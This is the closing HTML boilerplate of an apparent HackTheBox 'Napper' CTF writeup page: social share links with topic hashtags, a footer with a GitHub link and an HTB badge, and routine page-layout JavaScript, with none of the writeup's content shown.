    href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/2024/HTB/Napper.html&text=Writeup+for+HackTheBox Napper Writeup+from+HTB+held+on+03 May 2024&hashtags=ctf,writeup,Napper,HTB,information_disclosure,abusing_backdoor,naplistener,elasticsearch,reverse_engineering,go_reverse_engineering,decryption_with_AES,runascs','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
      class="fa fa-twitter" aria-hidden="true"></i></a>&nbsp;
  <a
    href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/2024/HTB/Napper.html&text=Writeup+for+HackTheBox Napper Writeup+from+HTB+held+on+2024-05-03 00:00:00 +0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
      class="fa fa-linkedin" aria-hidden="true"></i></a>
</div>
    </section>
  </div>

  <div id="comments" class="container">
    <section id="disqus_container">
      
    </section>
  </div>

  <footer>
    <div class="social d-flex flex-column justify-content-center w-100">
    <a href="/search" class="text-center w-100 mt-3 mb-2">
      <i class="fa fa-sm fa-search"></i>
    </a>
    <div class="social-links-bar d-flex justify-content-center mb-2">
        
        
        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
        </a>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    </div>
    
    <div class="htb_badge d-flex justify-content-center">
        
        <script src="https://www.hackthebox.eu/badge/831031"></script>
        
    </div>
    <div class="thm_badge">
        
    </div>
    
</div>

  </footer>

  <script src="http://localhost:4000/assets/js/prism.js"></script>
  <button onclick="topFunction()" class="fa fa-arrow-up" id="top" title="Go to top"></button>
  <script>
    topScroll = document.getElementById("top");

    window.onscroll = function () { scrollFunction() };

    function scrollFunction() {
      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
        topScroll.style.display = "block";
      } else {
        topScroll.style.display = "none";
      }
    }

    function topFunction() {
      document.body.scrollTop = 0;
      document.documentElement.scrollTop = 0;
    }

    $(window).on('load', function () {

      $('a[download]').each((i, e) => {
        $(e).addClass('fa fa-download');
      });

      setSizes();
    });

    $(window).resize(setSizes);

    function setSizes() {
      if ($(window).width() < 960) {
        $('#bottom-bar').hide();
        $('footer').show();
        $('#navbarSupportedContent').css('max-height', 'unset');
        $('.navbar-collapse').collapse('hide');
        if (document.body.clientHeight - $('#header').outerHeight() - $('#main_content').outerHeight() - $('#comments').outerHeight() < 150) {
          $('footer').css("position", "unset");
        } else {
          $('footer').css("position", "fixed");
        }
      }
      else {
        $('#bottom-bar').show();
        $('footer').hide();
        $('.navbar-collapse').collapse('show');
        $('footer').css("position", "fixed");
        $('#navbarSupportedContent').css('max-height', (document.body.clientHeight - $('.title-container').outerHeight() - $('#bottom-bar').outerHeight() - $('.navbar-toggler').outerHeight() - 50));
      }
    }
  </script>

</body>

</html>
